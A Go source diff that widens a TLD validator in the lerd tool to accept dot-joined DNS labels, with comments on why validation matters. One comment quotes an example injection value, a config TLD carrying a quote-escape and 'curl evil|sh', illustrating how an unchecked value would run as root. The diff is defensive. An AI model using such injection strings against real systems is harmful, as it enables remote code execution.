@@ -303,12 +303,30 @@ func sudoWriteFile(path string, content []byte, mode os.FileMode) error {
 // unusable one.
 const DefaultTLD = "test"
 
-// tldPattern is a single DNS label: letters, digits and hyphens. Nothing else can
-// be a TLD, and nothing else may reach the callers below.
-var tldPattern = regexp.MustCompile(`^[A-Za-z0-9]([A-Za-z0-9-]{0,61}[A-Za-z0-9])?$`)
+// tldLabelPattern is a single DNS label: letters, digits and hyphens. Nothing
+// else can appear in a TLD, and nothing else may reach the callers below.
+var tldLabelPattern = regexp.MustCompile(`^[A-Za-z0-9]([A-Za-z0-9-]{0,61}[A-Za-z0-9])?$`)
+
+// maxTLDLength is the DNS limit on a fully qualified name, minus the trailing dot.
+const maxTLDLength = 253
+
+// ValidTLD reports whether tld is one or more DNS labels joined by dots. Dots are
+// allowed because every other subsystem already appends dns.tld verbatim to build
+// site domains, and a dot is inert everywhere the value lands.
+func ValidTLD(tld string) bool {
+	if tld == "" || len(tld) > maxTLDLength {
+		return false
+	}
+	for _, label := range strings.Split(tld, ".") {
+		if !tldLabelPattern.MatchString(label) {
+			return false
+		}
+	}
+	return true
+}
 
 // ConfiguredTLD returns the TLD lerd serves, and refuses to return one that is
-// not a DNS label.
+// not a usable DNS suffix.
 //
 // Everything that writes or reads a .tld route has to agree on this: the dnsmasq
 // address records, the lerd0 link, the dispatcher and the diagnostic that checks
@@ -316,10 +334,11 @@ var tldPattern = regexp.MustCompile(`^[A-Za-z0-9]([A-Za-z0-9-]{0,61}[A-Za-z0-9])
 // command of a root-owned systemd unit that lerd writes and starts through its own
 // passwordless sudo grants, so a config.yaml carrying `tld: "test'; curl evil|sh; #"`
 // would otherwise be arbitrary code as root. Anything unusable falls back to the
-// default rather than reaching a shell.
+// default rather than reaching a shell. Readers go through here too, or a rejected
+// TLD leaves them hunting for a record the writer was never going to emit.
 func ConfiguredTLD() string {
 	tld := config.EffectiveTLD()
-	if !tldPattern.MatchString(tld) {
+	if !ValidTLD(tld) {
 		return DefaultTLD
 	}
 	return tld
